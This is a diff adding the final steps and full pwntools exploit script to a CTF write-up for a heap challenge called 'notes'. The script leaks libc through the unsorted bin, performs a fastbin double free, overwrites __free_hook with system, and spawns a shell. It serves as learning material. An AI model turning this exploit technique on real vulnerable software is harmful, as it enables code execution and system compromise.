@@ -49,5 +49,203 @@ The reason we're doing this in fastbin instead of tcache is because we don't hav
   free(a)
 ```
 
+![sameadr](https://github.com/user-attachments/assets/07d6beb3-88eb-490f-a148-6a5bb6f87511)
+
+```
+5 - Empty tcache line by mallocing 7 times (0x60)
+6 - Overwrite next pointer with __free_hook
+```
+
+![freehok](https://github.com/user-attachments/assets/73efc40b-5b9d-4e9c-9219-c6e9c7e6fa27)
+
+We have __free_hook in next pointer, all we have to do now is get that allocation into head of the tcache list. 
+
+```
+7 - Malloc twice
+```
+
+![headoflist](https://github.com/user-attachments/assets/675665c0-b5f1-47b8-a722-68ca42f2f805)
+
+All good.
+
+```
+8 - Malloc to start reading into the address of __free_hook, overwrite it with "system"
+```
+
+![freessyt](https://github.com/user-attachments/assets/1e712020-c651-456a-a623-9c0323b5eb3d)
+
+```
+9 - Malloc again to write "/bin/sh" when asked for content (for rdi)
+10 - Free the allocation with content "/bin/sh" and enjoy your shell :)
+```
+
+![flag](https://github.com/user-attachments/assets/27bd8bc8-7ca4-4dcc-a8c9-bb07dc82c57f)
+
+Thanks for the author for this cool challenge! As always, following sources helped me a lot through this:
+
+nobodyisnobody's write up: https://github.com/nobodyisnobody/write-ups/blob/main/justCTF.2022/pwn/notes/working.exploit.py
+double free on fastbin: https://book.hacktricks.xyz/binary-exploitation/libc-heap/double-free
+malloc hooks: https://0x434b.dev/overview-of-glibc-heap-exploitation-techniques/#malloc-hooks
+
+
+
+### Full Exploit
+```
+#!/usr/bin/env python3
+
+from pwn import *
+
+'''
+p = gdb.debug("./notes_patched", gdbscript="""
+    continue
+""")
+'''
+
+# set follow-fork-mode child
+
+p = process("./notes_patched")
+
+# unlimited notes
+p.recvuntil(b"to use? (0-10): ")
+p.sendline(b"-1")
+
+# allocate 9 chunks
+for i in range(9):
+    p.recvuntil(b">")
+    p.sendline("1")
+    p.recvuntil(b"size: ")
+    p.sendline("130")
+    p.recvuntil(b"content: ")
+    p.sendline()
+
+# free 8 chunks, so 7 of them will fill the tcache. the last one goes into unsorted bin
+for i in range(8):
+    p.recvuntil(b">")
+    p.sendline("2")
+    p.recvuntil(b"note id: ")
+    p.sendline(f"{i}")
+
+# leak unsorted main_arena addr
+p.recvuntil(b">")
+p.sendline("3")
+p.recvuntil(b"note id: ")
+p.sendline("7")
+
+# calculate offsets
+leak = p.recvline().strip()
+leak = int.from_bytes(leak, 'little')
+print("unsorted bin leak: " + hex(leak))
+
+libc_base = leak - 2018272
+print("LIBC_BASE: " + hex(libc_base))
+
+system = libc_base + 336528
+print("SYSTEM: " + hex(system))
+
+# FASTBIN DUP attack
+# allocate 10 chunks 
+for i in range(10):
+    p.recvuntil(b">")
+    p.sendline("1")
+    p.recvuntil(b"size: ")
+    p.sendline("60")
+    p.recvuntil(b"content: ")
+    p.sendline(b"test")
+
+
+# free 7 chunks to fill tcache
+for i in range(8):
+    p.recvuntil(b">")
+    p.sendline("2")
+    p.recvuntil(b"note id: ")
+    i = i + 9
+    p.sendline(f"{i}")
+
+# get a double free on fastbin
+p.recvuntil(b">")
+p.sendline("2")
+p.recvuntil(b"note id: ")
+p.sendline("17")
+
+p.recvuntil(b">")
+p.sendline("2")
+p.recvuntil(b"note id: ")
+p.sendline("18")
+
+p.recvuntil(b">")
+p.sendline("2")
+p.recvuntil(b"note id: ")
+p.sendline("17")
+
+# clear tcache(0x60) list
+# get them fastbins to tcache
+for i in range(7):
+    p.recvuntil(b">")
+    p.sendline("1")
+    p.recvuntil(b"size: ")
+    p.sendline("60")
+    p.recvuntil(b"content: ")
+    p.sendline()
+
+# overwrite next pointer with __free_hook
+free_hook = libc_base + 2027080
+print("free_hook: " + hex(free_hook))
+payload = p64(free_hook)
+
+p.recvuntil(b">")
+p.sendline("1")
+p.recvuntil(b"size: ")
+p.sendline("60")
+p.recvuntil(b"content: ")
+p.sendline(payload)
+
+# malloc 2 times to get the allocation head of the list 
+payload = b"BBBBBBBB"
+p.recvuntil(b">")
+p.sendline("1")
+p.recvuntil(b"size: ")
+p.sendline("60")
+p.recvuntil(b"content: ")
+p.sendline(payload)
+
+
+payload = b"CCCCCCCC"
+p.recvuntil(b">")
+p.sendline("1")
+p.recvuntil(b"size: ")
+p.sendline("60")
+p.recvuntil(b"content: ")
+p.sendline(payload)
+
+# overwrite the address __free_hook pointing with system
+payload = p64(system)
+payload += b"B" * 8
+
+p.recvuntil(b">")
+p.sendline("1")
+p.recvuntil(b"size: ")
+p.sendline("60")
+p.recvuntil(b"content: ")
+p.sendline(payload)
+
+# malloc again to pass "/bin/sh" 
+payload = "/bin/sh"
+p.recvuntil(b">")
+p.sendline("1")
+p.recvuntil(b"size: ")
+p.sendline("60")
+p.recvuntil(b"content: ")
+p.sendline(payload)
+
+# free the allocation with "/bin/sh" to call "system('/bin/sh')"
+# enjoy your shell >.>
+p.recvuntil(b">")
+p.sendline("2")
+p.recvuntil(b"note id: ")
+p.sendline("30")
+
+p.interactive()
+
+```
 
 
